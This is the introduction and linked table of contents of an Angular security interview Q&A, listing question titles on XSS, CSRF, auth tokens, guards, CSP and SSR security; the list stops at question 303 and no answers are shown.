# Angular Security Interview Questions and Answers

_Last updated: November 13, 2026_

450 interview questions with answers about security in Angular apps, split into three levels: 150 easy, 150 moderate and 150 advanced.

The answers target modern Angular (v22) with standalone components, functional guards and interceptors, `provideHttpClient()` and `@angular/ssr`. Older APIs like class-based guards, `HttpClientModule` and `HTTP_INTERCEPTORS` are mentioned where you will still see them in real projects. Keep in mind that most real security lives on the server: the front-end can make attacks harder, but it can't be the only line of defense.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What is XSS and why does it matter for an Angular app?](#1-what-is-xss-and-why-does-it-matter-for-an-angular-app)
- [2: How does Angular protect against XSS by default?](#2-how-does-angular-protect-against-xss-by-default)
- [3: What is the difference between escaping and sanitizing?](#3-what-is-the-difference-between-escaping-and-sanitizing)
- [4: Is interpolation with double curly braces safe?](#4-is-interpolation-with-double-curly-braces-safe)
- [5: What happens when you bind user data to innerHTML?](#5-what-happens-when-you-bind-user-data-to-innerhtml)
- [6: Why should you prefer interpolation over innerHTML when possible?](#6-why-should-you-prefer-interpolation-over-innerhtml-when-possible)
- [7: What is DomSanitizer?](#7-what-is-domsanitizer)
- [8: What are the security contexts in Angular?](#8-what-are-the-security-contexts-in-angular)
- [9: What does Angular do with a javascript: URL in an href binding?](#9-what-does-angular-do-with-a-javascript-url-in-an-href-binding)
- [10: What is a resource URL and why is it treated differently?](#10-what-is-a-resource-url-and-why-is-it-treated-differently)
- [11: What are the bypassSecurityTrust methods?](#11-what-are-the-bypasssecuritytrust-methods)
- [12: Why are bypassSecurityTrust methods risky?](#12-why-are-bypasssecuritytrust-methods-risky)
- [13: When is it okay to use bypassSecurityTrustResourceUrl?](#13-when-is-it-okay-to-use-bypasssecuritytrustresourceurl)
- [14: Why shouldn't you access the DOM directly through ElementRef?](#14-why-shouldnt-you-access-the-dom-directly-through-elementref)
- [15: Does Renderer2 sanitize values for you?](#15-does-renderer2-sanitize-values-for-you)
- [16: What is CSRF?](#16-what-is-csrf)
- [17: How does Angular's HttpClient help against CSRF?](#17-how-does-angulars-httpclient-help-against-csrf)
- [18: Which requests get the XSRF header automatically?](#18-which-requests-get-the-xsrf-header-automatically)
- [19: How do you change the XSRF cookie or header name?](#19-how-do-you-change-the-xsrf-cookie-or-header-name)
- [20: How do you turn off Angular's XSRF protection?](#20-how-do-you-turn-off-angulars-xsrf-protection)
- [21: What is a JWT?](#21-what-is-a-jwt)
- [22: Can you trust data you decode from a JWT in Angular?](#22-can-you-trust-data-you-decode-from-a-jwt-in-angular)
- [23: Where can an Angular app store an auth token?](#23-where-can-an-angular-app-store-an-auth-token)
- [24: Why is localStorage considered risky for tokens?](#24-why-is-localstorage-considered-risky-for-tokens)
- [25: What is an httpOnly cookie?](#25-what-is-an-httponly-cookie)
- [26: What do the Secure and SameSite cookie flags do?](#26-what-do-the-secure-and-samesite-cookie-flags-do)
- [27: What is an HTTP interceptor?](#27-what-is-an-http-interceptor)
- [28: How do you add an auth token to requests with an interceptor?](#28-how-do-you-add-an-auth-token-to-requests-with-an-interceptor)
- [29: Why should an auth interceptor not add the token to every URL?](#29-why-should-an-auth-interceptor-not-add-the-token-to-every-url)
- [30: What is a route guard?](#30-what-is-a-route-guard)
- [31: Do route guards secure your data?](#31-do-route-guards-secure-your-data)
- [32: What does CanActivateFn do?](#32-what-does-canactivatefn-do)
- [33: What does CanMatchFn do?](#33-what-does-canmatchfn-do)
- [34: What does CanDeactivateFn do?](#34-what-does-candeactivatefn-do)
- [35: Is hiding a button for non-admins enough to secure an admin action?](#35-is-hiding-a-button-for-non-admins-enough-to-secure-an-admin-action)
- [36: What is OAuth2?](#36-what-is-oauth2)
- [37: What is OpenID Connect (OIDC)?](#37-what-is-openid-connect-oidc)
- [38: What is PKCE?](#38-what-is-pkce)
- [39: Why shouldn't an SPA use the implicit flow anymore?](#39-why-shouldnt-an-spa-use-the-implicit-flow-anymore)
- [40: Which libraries are commonly used for OIDC in Angular?](#40-which-libraries-are-commonly-used-for-oidc-in-angular)
- [41: Why can't an Angular app keep a client secret?](#41-why-cant-an-angular-app-keep-a-client-secret)
- [42: What is Content Security Policy (CSP)?](#42-what-is-content-security-policy-csp)
- [43: What is a CSP nonce?](#43-what-is-a-csp-nonce)
- [44: What is ngCspNonce?](#44-what-is-ngcspnonce)
- [45: What is the CSP_NONCE token?](#45-what-is-the-csp_nonce-token)
- [46: What are Trusted Types?](#46-what-are-trusted-types)
- [47: How do you turn on Trusted Types for an Angular app?](#47-how-do-you-turn-on-trusted-types-for-an-angular-app)
- [48: What is template injection in Angular?](#48-what-is-template-injection-in-angular)
- [49: Why does AOT compilation help security?](#49-why-does-aot-compilation-help-security)
- [50: What is the problem with mixing server templates and Angular templates?](#50-what-is-the-problem-with-mixing-server-templates-and-angular-templates)
- [51: What is CORS?](#51-what-is-cors)
- [52: Is CORS a security feature that protects your API?](#52-is-cors-a-security-feature-that-protects-your-api)
- [53: What is the same-origin policy?](#53-what-is-the-same-origin-policy)
- [54: How do you fix a CORS error in development without changing the server?](#54-how-do-you-fix-a-cors-error-in-development-without-changing-the-server)
- [55: What is JSONP?](#55-what-is-jsonp)
- [56: Why is JSONP considered insecure?](#56-why-is-jsonp-considered-insecure)
- [57: What is an open redirect?](#57-what-is-an-open-redirect)
- [58: How do you safely handle a returnUrl after login?](#58-how-do-you-safely-handle-a-returnurl-after-login)
- [59: Why is client-side form validation not enough for security?](#59-why-is-client-side-form-validation-not-enough-for-security)
- [60: What is input validation and how does Angular support it?](#60-what-is-input-validation-and-how-does-angular-support-it)
- [61: Should you sanitize form input before sending it to the server?](#61-should-you-sanitize-form-input-before-sending-it-to-the-server)
- [62: What is Subresource Integrity (SRI)?](#62-what-is-subresource-integrity-sri)
- [63: How do you enable SRI in an Angular build?](#63-how-do-you-enable-sri-in-an-angular-build)
- [64: Why is it risky to load third-party scripts from a CDN?](#64-why-is-it-risky-to-load-third-party-scripts-from-a-cdn)
- [65: Are Angular environment files a safe place for secrets?](#65-are-angular-environment-files-a-safe-place-for-secrets)
- [66: What kinds of values are fine to put in an Angular environment file?](#66-what-kinds-of-values-are-fine-to-put-in-an-angular-environment-file)
- [67: What are source maps?](#67-what-are-source-maps)
- [68: Should you deploy source maps to production?](#68-should-you-deploy-source-maps-to-production)
- [69: What is clickjacking?](#69-what-is-clickjacking)
- [70: How do you protect an Angular app from clickjacking?](#70-how-do-you-protect-an-angular-app-from-clickjacking)
- [71: What is HTTPS and why does every Angular app need it?](#71-what-is-https-and-why-does-every-angular-app-need-it)
- [72: What is HSTS?](#72-what-is-hsts)
- [73: What does npm audit do?](#73-what-does-npm-audit-do)
- [74: Why is it important to keep Angular up to date?](#74-why-is-it-important-to-keep-angular-up-to-date)
- [75: How do you update Angular safely?](#75-how-do-you-update-angular-safely)
- [76: What is postMessage?](#76-what-is-postmessage)
- [77: What should you check when receiving a postMessage?](#77-what-should-you-check-when-receiving-a-postmessage)
- [78: Why should you not use * as the target origin in postMessage?](#78-why-should-you-not-use--as-the-target-origin-in-postmessage)
- [79: Are Web Workers a security boundary?](#79-are-web-workers-a-security-boundary)
- [80: What is the OWASP Top 10?](#80-what-is-the-owasp-top-10)
- [81: Which OWASP Top 10 risk is most related to Angular route guards?](#81-which-owasp-top-10-risk-is-most-related-to-angular-route-guards)
- [82: What does "never trust the client" mean?](#82-what-does-never-trust-the-client-mean)
- [83: How do you log out a user in an Angular app?](#83-how-do-you-log-out-a-user-in-an-angular-app)
- [84: Why isn't deleting the token on the client enough for logout?](#84-why-isnt-deleting-the-token-on-the-client-enough-for-logout)
- [85: What is a session timeout?](#85-what-is-a-session-timeout)
- [86: How do you show an idle timeout warning in Angular?](#86-how-do-you-show-an-idle-timeout-warning-in-angular)
- [87: What is the Authorization header?](#87-what-is-the-authorization-header)
- [88: Does using bearer tokens in headers protect you from CSRF?](#88-does-using-bearer-tokens-in-headers-protect-you-from-csrf)
- [89: What does withCredentials do in HttpClient?](#89-what-does-withcredentials-do-in-httpclient)
- [90: What is XSSI and how does Angular handle it?](#90-what-is-xssi-and-how-does-angular-handle-it)
- [91: What does a 401 status mean?](#91-what-does-a-401-status-mean)
- [92: What does a 403 status mean?](#92-what-does-a-403-status-mean)
- [93: What is the difference between authentication and authorization?](#93-what-is-the-difference-between-authentication-and-authorization)
- [94: What is an access token and a refresh token?](#94-what-is-an-access-token-and-a-refresh-token)
- [95: Why should access tokens be short-lived?](#95-why-should-access-tokens-be-short-lived)
- [96: Can Angular sanitize SQL or prevent SQL injection?](#96-can-angular-sanitize-sql-or-prevent-sql-injection)
- [97: What is DOM-based XSS?](#97-what-is-dom-based-xss)
- [98: What is stored XSS versus reflected XSS?](#98-what-is-stored-xss-versus-reflected-xss)
- [99: Why is eval dangerous in an Angular app?](#99-why-is-eval-dangerous-in-an-angular-app)
- [100: What is a security header?](#100-what-is-a-security-header)
- [101: What is the SafeHtml type?](#101-what-is-the-safehtml-type)
- [102: Is it safe to bind to the style attribute in Angular?](#102-is-it-safe-to-bind-to-the-style-attribute-in-angular)
- [103: Does Angular sanitize attribute bindings like attr.href?](#103-does-angular-sanitize-attribute-bindings-like-attrhref)
- [104: Why add rel="noopener" to links that open in a new tab?](#104-why-add-relnoopener-to-links-that-open-in-a-new-tab)
- [105: What is the sandbox attribute on an iframe?](#105-what-is-the-sandbox-attribute-on-an-iframe)
- [106: What does X-Content-Type-Options: nosniff do?](#106-what-does-x-content-type-options-nosniff-do)
- [107: What is Referrer-Policy?](#107-what-is-referrer-policy)
- [108: What is Permissions-Policy?](#108-what-is-permissions-policy)
- [109: What does a guard return to redirect the user?](#109-what-does-a-guard-return-to-redirect-the-user)
- [110: Can a guard return an Observable or a Promise?](#110-can-a-guard-return-an-observable-or-a-promise)
- [111: How do you show or hide UI based on roles in Angular?](#111-how-do-you-show-or-hide-ui-based-on-roles-in-angular)
- [112: Why is the hidden property a bad way to hide admin content?](#112-why-is-the-hidden-property-a-bad-way-to-hide-admin-content)
- [113: What is an ID token?](#113-what-is-an-id-token)
- [114: What is the state parameter in OAuth2?](#114-what-is-the-state-parameter-in-oauth2)
- [115: What is the nonce parameter in OIDC?](#115-what-is-the-nonce-parameter-in-oidc)
- [116: What is MSAL Angular?](#116-what-is-msal-angular)
- [117: What is angular-oauth2-oidc?](#117-what-is-angular-oauth2-oidc)
- [118: What is the redirect URI in OAuth2?](#118-what-is-the-redirect-uri-in-oauth2)
- [119: What does it mean that the browser is a hostile environment?](#119-what-does-it-mean-that-the-browser-is-a-hostile-environment)
- [120: Can a user change the Angular app's code in their browser?](#120-can-a-user-change-the-angular-apps-code-in-their-browser)
- [121: Why shouldn't you log tokens or personal data to the console?](#121-why-shouldnt-you-log-tokens-or-personal-data-to-the-console)
- [122: What is a security patch release in Angular?](#122-what-is-a-security-patch-release-in-angular)
- [123: How do you report a security issue in Angular itself?](#123-how-do-you-report-a-security-issue-in-angular-itself)
- [124: What is the difference between npm install and npm ci?](#124-what-is-the-difference-between-npm-install-and-npm-ci)
- [125: Why should you commit the package-lock.json file?](#125-why-should-you-commit-the-package-lockjson-file)
- [126: What is typosquatting in npm?](#126-what-is-typosquatting-in-npm)
- [127: What is a supply chain attack?](#127-what-is-a-supply-chain-attack)
- [128: Does the Angular dev server belong in production?](#128-does-the-angular-dev-server-belong-in-production)
- [129: What does dev mode do that production mode doesn't?](#129-what-does-dev-mode-do-that-production-mode-doesnt)
- [130: What is server-side rendering (SSR) in Angular?](#130-what-is-server-side-rendering-ssr-in-angular)
- [131: What is hydration in Angular?](#131-what-is-hydration-in-angular)
- [132: What is TransferState?](#132-what-is-transferstate)
- [133: Why should you never put secrets in TransferState?](#133-why-should-you-never-put-secrets-in-transferstate)
- [134: Why is code in an SSR app more sensitive than in a client-only app?](#134-why-is-code-in-an-ssr-app-more-sensitive-than-in-a-client-only-app)
- [135: What is i18n in Angular?](#135-what-is-i18n-in-angular)
- [136: Can translation files be a security risk?](#136-can-translation-files-be-a-security-risk)
- [137: What is an ICU expression?](#137-what-is-an-icu-expression)
- [138: What is a Content-Security-Policy report-only mode?](#138-what-is-a-content-security-policy-report-only-mode)
- [139: Why is 'unsafe-inline' in script-src a problem?](#139-why-is-unsafe-inline-in-script-src-a-problem)
- [140: What is 'unsafe-eval' in CSP and does Angular need it?](#140-what-is-unsafe-eval-in-csp-and-does-angular-need-it)
- [141: What does the CSP directive object-src 'none' do?](#141-what-does-the-csp-directive-object-src-none-do)
- [142: What does base-uri do in CSP?](#142-what-does-base-uri-do-in-csp)
- [143: Why should a password field use type="password"?](#143-why-should-a-password-field-use-typepassword)
- [144: Should you store passwords in the Angular app?](#144-should-you-store-passwords-in-the-angular-app)
- [145: What is a BFF (Backend for Frontend) in auth?](#145-what-is-a-bff-backend-for-frontend-in-auth)
- [146: What does HttpOnly not protect against?](#146-what-does-httponly-not-protect-against)
- [147: How do you read query params safely in Angular?](#147-how-do-you-read-query-params-safely-in-angular)
- [148: Why should error messages shown to users be generic?](#148-why-should-error-messages-shown-to-users-be-generic)
- [149: What is a security code review checklist item for Angular?](#149-what-is-a-security-code-review-checklist-item-for-angular)
- [150: What is the main rule of Angular security?](#150-what-is-the-main-rule-of-angular-security)

### Moderate Questions (151-300)

- [151: How does Angular decide which security context a binding uses?](#151-how-does-angular-decide-which-security-context-a-binding-uses)
- [152: How do you sanitize a value manually and what does sanitize() return?](#152-how-do-you-sanitize-a-value-manually-and-what-does-sanitize-return)
- [153: How would you write a pipe that renders HTML safely?](#153-how-would-you-write-a-pipe-that-renders-html-safely)
- [154: How do you use DOMPurify with Angular?](#154-how-do-you-use-dompurify-with-angular)
- [155: How do you render Markdown from users safely?](#155-how-do-you-render-markdown-from-users-safely)
- [156: Which URLs does Angular's URL sanitizer allow?](#156-which-urls-does-angulars-url-sanitizer-allow)
- [157: Why does the content look different after Angular sanitizes innerHTML?](#157-why-does-the-content-look-different-after-angular-sanitizes-innerhtml)
- [158: What do NG0904 and NG0910 errors mean?](#158-what-do-ng0904-and-ng0910-errors-mean)
- [159: In what order do functional interceptors run?](#159-in-what-order-do-functional-interceptors-run)
- [160: How do class-based interceptors fit into modern Angular?](#160-how-do-class-based-interceptors-fit-into-modern-angular)
- [161: How does a 401 refresh flow work in an interceptor?](#161-how-does-a-401-refresh-flow-work-in-an-interceptor)
- [162: How do you stop an interceptor from causing an endless refresh loop?](#162-how-do-you-stop-an-interceptor-from-causing-an-endless-refresh-loop)
- [163: What is HttpContextToken and how is it useful for auth?](#163-what-is-httpcontexttoken-and-how-is-it-useful-for-auth)
- [164: How do you attach different tokens for different APIs?](#164-how-do-you-attach-different-tokens-for-different-apis)
- [165: How should an Angular app handle a 403 response globally?](#165-how-should-an-angular-app-handle-a-403-response-globally)
- [166: Why should a guard wait for auth initialization?](#166-why-should-a-guard-wait-for-auth-initialization)
- [167: What is canActivateChild used for?](#167-what-is-canactivatechild-used-for)
- [168: How do you write a role guard using route data?](#168-how-do-you-write-a-role-guard-using-route-data)
- [169: Does CanMatchFn stop a user from getting a lazy-loaded chunk's code?](#169-does-canmatchfn-stop-a-user-from-getting-a-lazy-loaded-chunks-code)
- [170: Why doesn't CanDeactivate stop the user from closing the tab?](#170-why-doesnt-candeactivate-stop-the-user-from-closing-the-tab)
- [171: How should a resolver behave when the API returns 403?](#171-how-should-a-resolver-behave-when-the-api-returns-403)
- [172: What is RedirectCommand?](#172-what-is-redirectcommand)
- [173: How do you set up angular-oauth2-oidc with code flow and PKCE in a standalone app?](#173-how-do-you-set-up-angular-oauth2-oidc-with-code-flow-and-pkce-in-a-standalone-app)
- [174: What is the difference between silent refresh with an iframe and refresh tokens?](#174-what-is-the-difference-between-silent-refresh-with-an-iframe-and-refresh-tokens)
- [175: How do you configure MSAL Angular to add tokens only for specific APIs?](#175-how-do-you-configure-msal-angular-to-add-tokens-only-for-specific-apis)
- [176: Should you use popup or redirect login with MSAL or other OIDC libraries?](#176-should-you-use-popup-or-redirect-login-with-msal-or-other-oidc-libraries)
- [177: What should the client check in tokens, and what can it skip?](#177-what-should-the-client-check-in-tokens-and-what-can-it-skip)
- [178: How do you check if a JWT is expired on the client?](#178-how-do-you-check-if-a-jwt-is-expired-on-the-client)
- [179: What is refresh token rotation?](#179-what-is-refresh-token-rotation)
- [180: How do you change where angular-oauth2-oidc stores tokens?](#180-how-do-you-change-where-angular-oauth2-oidc-stores-tokens)
- [181: How do you work with cookie-based sessions in Angular?](#181-how-do-you-work-with-cookie-based-sessions-in-angular)
- [182: If cookies are SameSite=Lax, do you still need CSRF tokens?](#182-if-cookies-are-samesitelax-do-you-still-need-csrf-tokens)
- [183: How do you protect a cross-origin cookie-based API from CSRF?](#183-how-do-you-protect-a-cross-origin-cookie-based-api-from-csrf)
- [184: What is a CORS preflight request?](#184-what-is-a-cors-preflight-request)
- [185: Why can't a server use Access-Control-Allow-Origin: * with credentials?](#185-why-cant-a-server-use-access-control-allow-origin--with-credentials)
- [186: Why is reflecting the Origin header in CORS dangerous?](#186-why-is-reflecting-the-origin-header-in-cors-dangerous)
- [187: How do you make a JSONP request in Angular, and when is it acceptable?](#187-how-do-you-make-a-jsonp-request-in-angular-and-when-is-it-acceptable)
- [188: Does withFetch change anything about security?](#188-does-withfetch-change-anything-about-security)
- [189: How do you handle a redirect to an external URL safely?](#189-how-do-you-handle-a-redirect-to-an-external-url-safely)
- [190: What does router.navigateByUrl do with a full external URL?](#190-what-does-routernavigatebyurl-do-with-a-full-external-url)
- [191: How do OIDC libraries remember where to send the user after login?](#191-how-do-oidc-libraries-remember-where-to-send-the-user-after-login)
- [192: How do you write a custom validator in Angular forms?](#192-how-do-you-write-a-custom-validator-in-angular-forms)
- [193: How can an async validator leak information?](#193-how-can-an-async-validator-leak-information)
- [194: How should you validate file uploads in Angular?](#194-how-should-you-validate-file-uploads-in-angular)
- [195: Why are user-uploaded SVG files dangerous?](#195-why-are-user-uploaded-svg-files-dangerous)
- [196: How do you download a file from an API safely in Angular?](#196-how-do-you-download-a-file-from-an-api-safely-in-angular)
- [197: How do you handle output from a rich text editor like Quill or TinyMCE?](#197-how-do-you-handle-output-from-a-rich-text-editor-like-quill-or-tinymce)
- [198: How is Angular's sanitizer different from DOMPurify?](#198-how-is-angulars-sanitizer-different-from-dompurify)
- [199: How do you load a third-party script dynamically and keep it safe?](#199-how-do-you-load-a-third-party-script-dynamically-and-keep-it-safe)
- [200: What are the risks of Google Tag Manager or similar tag tools?](#200-what-are-the-risks-of-google-tag-manager-or-similar-tag-tools)
- [201: Why can't you use SRI with Google Fonts CSS?](#201-why-cant-you-use-sri-with-google-fonts-css)
- [202: Why does SRI need the crossorigin attribute?](#202-why-does-sri-need-the-crossorigin-attribute)
- [203: Is a runtime config.json safer than environment.ts for secrets?](#203-is-a-runtime-configjson-safer-than-environmentts-for-secrets)
- [204: How can you check your production bundle for leaked secrets?](#204-how-can-you-check-your-production-bundle-for-leaked-secrets)
- [205: What does the define option in the Angular build do, and is it safe for secrets?](#205-what-does-the-define-option-in-the-angular-build-do-and-is-it-safe-for-secrets)
- [206: How do you use hidden source maps with an error tracking tool?](#206-how-do-you-use-hidden-source-maps-with-an-error-tracking-tool)
- [207: A secret was committed to git and then removed. Is it safe now?](#207-a-secret-was-committed-to-git-and-then-removed-is-it-safe-now)
- [208: Why prefer frame-ancestors over X-Frame-Options?](#208-why-prefer-frame-ancestors-over-x-frame-options)
- [209: Is JavaScript frame-busting a good clickjacking defense?](#209-is-javascript-frame-busting-a-good-clickjacking-defense)
- [210: What should you know before enabling HSTS preload?](#210-what-should-you-know-before-enabling-hsts-preload)
- [211: What is mixed content?](#211-what-is-mixed-content)
- [212: How do you add security headers to ng serve during development?](#212-how-do-you-add-security-headers-to-ng-serve-during-development)
- [213: Where do you set security headers for a static Angular app?](#213-where-do-you-set-security-headers-for-a-static-angular-app)
- [214: How do you add security headers in an Angular SSR server?](#214-how-do-you-add-security-headers-in-an-angular-ssr-server)
- [215: How do you use npm audit in CI without blocking on noise?](#215-how-do-you-use-npm-audit-in-ci-without-blocking-on-noise)
- [216: What do Dependabot and Renovate do?](#216-what-do-dependabot-and-renovate-do)
- [217: How do you fix a vulnerable transitive dependency?](#217-how-do-you-fix-a-vulnerable-transitive-dependency)
- [218: Why are npm install scripts a risk?](#218-why-are-npm-install-scripts-a-risk)
- [219: How long is an Angular version supported?](#219-how-long-is-an-angular-version-supported)
- [220: How do you add a Web Worker to an Angular app and keep it secure?](#220-how-do-you-add-a-web-worker-to-an-angular-app-and-keep-it-secure)
- [221: How do you validate the content of postMessage data?](#221-how-do-you-validate-the-content-of-postmessage-data)
- [222: What is MessageChannel and why is it safer than window.postMessage for iframes?](#222-what-is-messagechannel-and-why-is-it-safer-than-windowpostmessage-for-iframes)
- [223: How do you sync logout across browser tabs?](#223-how-do-you-sync-logout-across-browser-tabs)
- [224: How do you keep the client session timer in sync with the server?](#224-how-do-you-keep-the-client-session-timer-in-sync-with-the-server)
- [225: How do you log out properly with an OIDC provider?](#225-how-do-you-log-out-properly-with-an-oidc-provider)
- [226: How do you clear app state on logout in an NgRx app?](#226-how-do-you-clear-app-state-on-logout-in-an-ngrx-app)
- [227: Does Angular's HTTP transfer cache store requests that have an Authorization header?](#227-does-angulars-http-transfer-cache-store-requests-that-have-an-authorization-header)
- [228: How do you exclude specific requests from the SSR transfer cache?](#228-how-do-you-exclude-specific-requests-from-the-ssr-transfer-cache)
- [229: How can state leak between users in Angular SSR?](#229-how-can-state-leak-between-users-in-angular-ssr)
- [230: How do you forward the user's cookies to your API during SSR?](#230-how-do-you-forward-the-users-cookies-to-your-api-during-ssr)
- [231: Is Angular's escaping also active during SSR?](#231-is-angulars-escaping-also-active-during-ssr)
- [232: What is the risk of prerendering (SSG) pages that depend on the user?](#232-what-is-the-risk-of-prerendering-ssg-pages-that-depend-on-the-user)
- [233: How should user content be used with $localize?](#233-how-should-user-content-be-used-with-localize)
- [234: What is ICU message injection?](#234-what-is-icu-message-injection)
- [235: What is the risk of HTML in ngx-translate translations?](#235-what-is-the-risk-of-html-in-ngx-translate-translations)
- [236: How do you test that a component doesn't render injected HTML?](#236-how-do-you-test-that-a-component-doesnt-render-injected-html)
- [237: How do you unit test a functional guard?](#237-how-do-you-unit-test-a-functional-guard)
- [238: How do you unit test an auth interceptor?](#238-how-do-you-unit-test-an-auth-interceptor)
- [239: How can you catch CSP violations in end-to-end tests?](#239-how-can-you-catch-csp-violations-in-end-to-end-tests)
- [240: Which static analysis tools help find security problems in Angular code?](#240-which-static-analysis-tools-help-find-security-problems-in-angular-code)
- [241: What is DAST and how do you use it against an Angular app?](#241-what-is-dast-and-how-do-you-use-it-against-an-angular-app)
- [242: How does the OWASP Top 10 map to Angular apps?](#242-how-does-the-owasp-top-10-map-to-angular-apps)
- [243: What is SSRF and how can it happen in Angular SSR?](#243-what-is-ssrf-and-how-can-it-happen-in-angular-ssr)
- [244: Can Renderer2.setAttribute create an XSS hole?](#244-can-renderer2setattribute-create-an-xss-hole)
- [245: Are host bindings sanitized?](#245-are-host-bindings-sanitized)
- [246: Is creating components dynamically with ViewContainerRef safe?](#246-is-creating-components-dynamically-with-viewcontainerref-safe)
- [247: How should you handle innerHTML inside an Angular Element (custom element)?](#247-how-should-you-handle-innerhtml-inside-an-angular-element-custom-element)
- [248: How do you read the XSRF token yourself, for example for a cross-origin call?](#248-how-do-you-read-the-xsrf-token-yourself-for-example-for-a-cross-origin-call)
- [249: Why shouldn't you put tokens in URLs?](#249-why-shouldnt-you-put-tokens-in-urls)
- [250: How do you secure a WebSocket connection from Angular?](#250-how-do-you-secure-a-websocket-connection-from-angular)
- [251: How do you secure Server-Sent Events (EventSource) in Angular?](#251-how-do-you-secure-server-sent-events-eventsource-in-angular)
- [252: What should the front-end do in a password reset flow?](#252-what-should-the-front-end-do-in-a-password-reset-flow)
- [253: How do you build a multi-factor login screen in Angular without weakening it?](#253-how-do-you-build-a-multi-factor-login-screen-in-angular-without-weakening-it)
- [254: How can login error messages cause user enumeration?](#254-how-can-login-error-messages-cause-user-enumeration)
- [255: Does disabling the submit button stop brute-force attacks?](#255-does-disabling-the-submit-button-stop-brute-force-attacks)
- [256: How do you add a CAPTCHA to an Angular form?](#256-how-do-you-add-a-captcha-to-an-angular-form)
- [257: Why should NgRx Store DevTools be limited in production?](#257-why-should-ngrx-store-devtools-be-limited-in-production)
- [258: How do you scrub sensitive data in a custom ErrorHandler?](#258-how-do-you-scrub-sensitive-data-in-a-custom-errorhandler)
- [259: What should you avoid when sending errors and analytics from Angular?](#259-what-should-you-avoid-when-sending-errors-and-analytics-from-angular)
- [260: How can the Angular service worker cache sensitive API data?](#260-how-can-the-angular-service-worker-cache-sensitive-api-data)
- [261: How do you clear service worker caches on logout?](#261-how-do-you-clear-service-worker-caches-on-logout)
- [262: Which Cache-Control headers should private API responses have?](#262-which-cache-control-headers-should-private-api-responses-have)
- [263: Why can a user see private data after logout by pressing Back?](#263-why-can-a-user-see-private-data-after-logout-by-pressing-back)
- [264: When should you use autocomplete="off"?](#264-when-should-you-use-autocompleteoff)
- [265: What are the security concerns with the Clipboard API?](#265-what-are-the-security-concerns-with-the-clipboard-api)
- [266: How do you safely show links that users entered in their profile?](#266-how-do-you-safely-show-links-that-users-entered-in-their-profile)
- [267: How do you build API URLs with user input safely?](#267-how-do-you-build-api-urls-with-user-input-safely)
- [268: What is mass assignment and how does the front-end make it easy?](#268-what-is-mass-assignment-and-how-does-the-front-end-make-it-easy)
- [269: Are disabled or hidden form fields a security control?](#269-are-disabled-or-hidden-form-fields-a-security-control)
- [270: What is IDOR and how does it show up in Angular apps?](#270-what-is-idor-and-how-does-it-show-up-in-angular-apps)
- [271: Why can feature flags leak unreleased features?](#271-why-can-feature-flags-leak-unreleased-features)
- [272: What is the problem with Angular CLI's inline critical CSS and strict CSP?](#272-what-is-the-problem-with-angular-clis-inline-critical-css-and-strict-csp)
- [273: What does security.autoCsp do in angular.json?](#273-what-does-securityautocsp-do-in-angularjson)
- [274: How do you replace the ngCspNonce value per request without SSR?](#274-how-do-you-replace-the-ngcspnonce-value-per-request-without-ssr)
- [275: Why does Angular need a style nonce at all?](#275-why-does-angular-need-a-style-nonce-at-all)
- [276: How do you collect CSP violation reports?](#276-how-do-you-collect-csp-violation-reports)
- [277: Which Trusted Types policy names does Angular use?](#277-which-trusted-types-policy-names-does-angular-use)
- [278: How do you test Trusted Types in development and unit tests?](#278-how-do-you-test-trusted-types-in-development-and-unit-tests)
- [279: What happens when a third-party library breaks under Trusted Types?](#279-what-happens-when-a-third-party-library-breaks-under-trusted-types)
- [280: Why should production apps avoid the JIT compiler?](#280-why-should-production-apps-avoid-the-jit-compiler)
- [281: How do you render CMS-driven pages without compiling templates at runtime?](#281-how-do-you-render-cms-driven-pages-without-compiling-templates-at-runtime)
- [282: How do user-supplied image URLs affect privacy and security?](#282-how-do-user-supplied-image-urls-affect-privacy-and-security)
- [283: How does connect-src in CSP help after an XSS bug?](#283-how-does-connect-src-in-csp-help-after-an-xss-bug)
- [284: What should you think about before adding analytics to an Angular app?](#284-what-should-you-think-about-before-adding-analytics-to-an-angular-app)
- [285: What if your Angular app must be embedded in an iframe by partners?](#285-what-if-your-angular-app-must-be-embedded-in-an-iframe-by-partners)
- [286: What are __Host- and __Secure- cookie prefixes?](#286-what-are-__host--and-__secure--cookie-prefixes)
- [287: How do you debug "WARNING: sanitizing HTML stripped some content"?](#287-how-do-you-debug-warning-sanitizing-html-stripped-some-content)
- [288: How do you prevent an XSS hole when using a charting or map library?](#288-how-do-you-prevent-an-xss-hole-when-using-a-charting-or-map-library)
- [289: Why use a strict TypeScript setup for security?](#289-why-use-a-strict-typescript-setup-for-security)
- [290: How do you validate API responses at runtime in Angular?](#290-how-do-you-validate-api-responses-at-runtime-in-angular)
- [291: What is the risk of storing data in IndexedDB or localStorage for offline use?](#291-what-is-the-risk-of-storing-data-in-indexeddb-or-localstorage-for-offline-use)
- [292: Why shouldn't you use window.name, URL hash or document.referrer as trusted data?](#292-why-shouldnt-you-use-windowname-url-hash-or-documentreferrer-as-trusted-data)
- [293: How do you restrict which domains can load your fonts, images and scripts?](#293-how-do-you-restrict-which-domains-can-load-your-fonts-images-and-scripts)
- [294: Should an Angular app use a meta tag or an HTTP header for CSP?](#294-should-an-angular-app-use-a-meta-tag-or-an-http-header-for-csp)
- [295: How do you keep a strict CSP when using inline event handlers in third-party widgets?](#295-how-do-you-keep-a-strict-csp-when-using-inline-event-handlers-in-third-party-widgets)
- [296: How does Angular's (click) binding differ from an onclick attribute for CSP?](#296-how-does-angulars-click-binding-differ-from-an-onclick-attribute-for-csp)
- [297: What should you check in a pull request that adds a new npm dependency?](#297-what-should-you-check-in-a-pull-request-that-adds-a-new-npm-dependency)
- [298: How do you lock down CI so a malicious dependency can't steal secrets?](#298-how-do-you-lock-down-ci-so-a-malicious-dependency-cant-steal-secrets)
- [299: How do you check which Angular version and packages are deployed in production?](#299-how-do-you-check-which-angular-version-and-packages-are-deployed-in-production)
- [300: What security checks would you add to an Angular project's CI pipeline?](#300-what-security-checks-would-you-add-to-an-angular-projects-ci-pipeline)

### Advanced Questions (301-450)

- [301: How does Angular's HTML sanitizer work internally?](#301-how-does-angulars-html-sanitizer-work-internally)
- [302: What is mutation XSS and how does Angular defend against it?](#302-what-is-mutation-xss-and-how-does-angular-defend-against-it)
- [303: How does the compiler decide which bindings get sanitized at runtime?](#303-how-does-the-compiler-decide-which-bindings-get-sanitized-at-runtime)
